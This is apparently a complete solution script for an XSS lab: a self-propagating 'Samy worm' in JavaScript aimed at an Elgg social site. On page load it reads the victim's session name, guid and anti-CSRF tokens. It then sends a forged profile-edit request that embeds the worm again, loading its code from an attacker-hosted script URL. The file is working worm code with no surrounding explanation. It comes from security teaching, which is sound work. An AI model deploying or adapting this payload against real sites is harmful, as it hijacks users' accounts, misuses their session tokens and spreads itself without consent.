window.onload = function(){
var headerTag = "</"+"p><script id=\"worm\" src=\"http://www.csrflabattacker.com/task4-link.js\" type=\"text/javascript\">";
var worm=document.getElementById("worm").innerHTML;
var wormEncoded=encodeURIComponent(worm);
var tailTag = "</"+"script><p>";
//JavaScript code to access user name, user guid, Time Stamp elgg_ts
//and Security Token elgg_token
var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

//Construct the content of your url.
var content=token
content+=ts
content+="&name="
content+=userName
content+="&description=<p>This is Samy worm</"+"p>"+headerTag+wormEncoded+tailTag
content+="&accesslevel[description]=2&briefdescription=You are infected with Samy worm.&accesslevel[briefdescription]=2&location="
content+="&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail="
content+="&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website="
content+="&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid="
content+=guid
//Create and send Ajax request to modify profile 
alert('You are infected');
var Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(content);
}
